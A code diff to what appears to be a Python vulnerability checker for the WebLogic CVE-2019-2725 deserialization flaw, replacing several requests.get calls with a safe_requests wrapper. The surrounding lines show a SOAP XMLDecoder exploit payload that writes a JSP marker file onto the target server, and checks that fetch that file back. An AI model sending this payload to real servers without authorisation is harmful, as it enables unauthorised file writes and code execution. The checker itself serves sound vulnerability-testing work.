@@ -12,6 +12,7 @@ CVE-2019-2725
 """
 import requests
 import time
+from security import safe_requests
 
 poc_all = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/goop.jsp</string><void method="println"><string><![CDATA[
 <%out.println("Check_Vuln_Weblogic"); %>]]>
@@ -96,7 +97,7 @@ def url_check(url):
     }
     url = url + '/_async/AsyncResponseService'
     try:
-        req = requests.get(url, headers=headers, timeout=timeout)
+        req = safe_requests.get(url, headers=headers, timeout=timeout)
         if 'AsyncResponseService home page' in req.text:
             result = "目标可能存在WebLogic wls9-async远程命令执行漏洞（CNVD-C-2019-48814）, check url: %s" % url
             return result
@@ -112,7 +113,7 @@ def txt_check_all(url):
     try:
         req2 = requests.post(url + '/_async/AsyncResponseService', headers=headers, timeout=timeout, data=poc_all, )
         time.sleep(1.5)
-        req_txt = requests.get(url + '/_async/goop.jsp', timeout=timeout)
+        req_txt = safe_requests.get(url + '/_async/goop.jsp', timeout=timeout)
         if 'Check_Vuln_Weblogic' in req_txt.text:
             result = "目标存在WebLogic wls9-async远程命令执行漏洞（CNVD-C-2019-48814）, check url: %s" % (
                     url + '/_async/goop.jsp')
@@ -130,7 +131,7 @@ def txt_check_lin(url):
     try:
         req2 = requests.post(url + '/_async/AsyncResponseService', headers=headers, timeout=timeout, data=lin_poc, )
         time.sleep(1.5)
-        req_txt = requests.get(url + '/_async/goop.txt', timeout=timeout)
+        req_txt = safe_requests.get(url + '/_async/goop.txt', timeout=timeout)
         if 'Vuln_GOOP' in req_txt.text:
             result = "目标存在WebLogic wls9-async远程命令执行漏洞（CNVD-C-2019-48814）, OS : linux check url: %s" % (
                     url + '/_async/goop.txt')
@@ -148,7 +149,7 @@ def txt_check_win(url):
     try:
         req2 = requests.post(url + '/_async/AsyncResponseService', headers=headers, timeout=timeout, data=win_poc, )
         time.sleep(1.5)
-        req_txt = requests.get(url + '/_async/goop.txt', timeout=timeout)
+        req_txt = safe_requests.get(url + '/_async/goop.txt', timeout=timeout)
         # print(req_txt.text)
         if 'Vuln_GOOP' in req_txt.text:
             result = "目标存在WebLogic wls9-async远程命令执行漏洞（CNVD-C-2019-48814）, OS : win check url: %s" % (
